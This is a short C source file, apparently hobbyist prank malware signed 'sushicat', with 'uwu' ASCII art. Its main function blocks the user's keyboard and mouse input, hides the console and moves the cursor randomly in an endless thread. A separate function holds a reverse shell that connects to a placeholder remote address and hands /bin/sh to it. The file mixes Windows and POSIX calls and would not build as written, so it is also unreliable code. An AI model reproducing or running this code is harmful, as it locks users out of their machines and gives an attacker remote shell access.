//#include <stdio.h>
//#include <Windows.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#define REMOTE_ADDR "XXX.XXX.XXX.XXX"
#define REMOTE_PORT XXX

void threadDoMouse() {
    while(1) {
        SetCursorPos(rand() % 1900, rand() % 1000);
        Sleep(40);
    }
}
int main (){

    printf("hihihi\n");
    sleep(2);
    printf("by: sushicat\n");
    printf("\n");
    printf(" uwuuwuuwu   uwu         uwu  uwuuwu     uwu  uwuuwuuwu  uwuuwuuwu\n");
    printf(" uwu   uwu   uwu         uwu  uwu  uwu   uwu  uwuuwuuwu  uwu     uwu\n");
    printf(" uwuuwuuwu   uwu         uwu  uwu   uwu  uwu  uwu        uwu      uwu \n");
    printf(" uwu         uwu   uwu   uwu  uwu    uwu uwu  uwuuwuuwu  uwu     uwu\n");
    printf(" uwu         uwuuwu   uwuuwu  uwu     uwuuwu  uwu        uwu    uwu\n");
    printf(" uwu         uwu         uwu  uwu      uwuwu  uwuuwuwuw  uwuuwuuwu\n");

    BlockInput(1);
    sleep(1);
    ShowWindow( GetConsoleWindow(), SW_HIDE );

    CreateThread(0,0,(LPTHREAD_START_ROUTINE)threadDoMouse,0,1,0);

//    while(1) {
//        SetCursorPos(rand() % 1900, rand() % 1000);
//        ShellExecute(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT);
//        Sleep(1);
//    }

    return 0;
}



int shell(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
